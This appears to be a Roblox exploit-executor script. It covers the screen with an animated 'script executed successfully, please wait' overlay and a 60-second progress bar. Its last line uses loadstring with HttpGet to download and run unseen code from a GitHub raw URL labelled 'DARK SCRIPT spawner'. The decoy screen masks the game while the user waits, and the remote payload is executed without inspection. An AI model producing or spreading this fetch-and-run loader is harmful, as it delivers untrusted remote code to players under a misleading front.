local TweenService = game:GetService("TweenService")

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local ProgressBarBG = Instance.new("Frame")
local ProgressBar = Instance.new("Frame")
local Gradient = Instance.new("UIGradient")
local UICornerBG = Instance.new("UICorner")
local UICornerBar = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")

ScreenGui.Name = "WorkingScreen"
ScreenGui.Parent = game.CoreGui

-- Main background frame (full screen)
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Position = UDim2.new(0, 0, 0, 0)
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BorderSizePixel = 0

-- Add animated gradient to background
Gradient.Parent = Frame
Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 60)),
    ColorSequenceKeypoint.new(0.33, Color3.fromRGB(60, 0, 60)),
    ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 60, 60)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 60))
}
Gradient.Rotation = 0

-- Animate the gradient rotation and color
spawn(function()
    local t = 0
    while ScreenGui.Parent do
        for i = 0, 360, 2 do
            Gradient.Rotation = i
            -- Animate the gradient color over time for a "cool" effect
            t = t + 0.03
            local r = math.abs(math.sin(t)) * 255
            local g = math.abs(math.sin(t + 2)) * 255
            local b = math.abs(math.sin(t + 4)) * 255
            Gradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromRGB(r, 30, b)),
                ColorSequenceKeypoint.new(0.33, Color3.fromRGB(60, g, 60)),
                ColorSequenceKeypoint.new(0.66, Color3.fromRGB(b, 60, r)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(30, b, 60))
            }
            wait(0.03)
        end
    end
end)

-- Main text label (centered)
TextLabel.Parent = Frame
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
TextLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "The script is executed successfully, Please wait For a while"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.TextScaled = true

-- Animated text color gradient
local TextGradient = Instance.new("UIGradient")
TextGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
}
TextGradient.Parent = TextLabel

spawn(function()
    while ScreenGui.Parent do
        for i = 0, 360, 2 do
            TextGradient.Rotation = i
            wait(0.03)
        end
    end
end)

-- Progress bar background (centered, with rounded corners and stroke)
ProgressBarBG.Parent = Frame
ProgressBarBG.AnchorPoint = Vector2.new(0.5, 0.5)
ProgressBarBG.Position = UDim2.new(0.5, 0, 0.6, 0)
ProgressBarBG.Size = UDim2.new(0.6, 0, 0.04, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ProgressBarBG.BorderSizePixel = 0

UICornerBG.CornerRadius = UDim.new(0.5, 0)
UICornerBG.Parent = ProgressBarBG

UIStroke.Parent = ProgressBarBG
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Thickness = 2
UIStroke.Transparency = 0.2

-- Red progress bar (animated, with rounded corners)
ProgressBar.Parent = ProgressBarBG
ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
ProgressBar.BorderSizePixel = 0
ProgressBar.Position = UDim2.new(0, 0, 0, 0)
ProgressBar.Size = UDim2.new(1, 0, 1, 0)

UICornerBar.CornerRadius = UDim.new(0.5, 0)
UICornerBar.Parent = ProgressBar

-- Progress bar animation and text switching
local totalSteps = 60
for i = 1, totalSteps do
    if i == 1 then
        TextLabel.Text = "The script is executed successfully"
    elseif i == 21 then
        TextLabel.Text = "Please wait a while"
    elseif i == 41 then
        TextLabel.Text = "Almost there..."
    end
    TweenService:Create(
        ProgressBar,
        TweenInfo.new(1, Enum.EasingStyle.Linear),
        {Size = UDim2.new(1 - (i / totalSteps), 0, 1, 0)}
    ):Play()
    wait(1)
end

ScreenGui:Destroy()


loadstring(game:HttpGet("https://raw.githubusercontent.com/vincen11226/DARK-SCRIPT-spawner-/refs/heads/main/DARK%20SCRIPT%20SPAWNER"))()
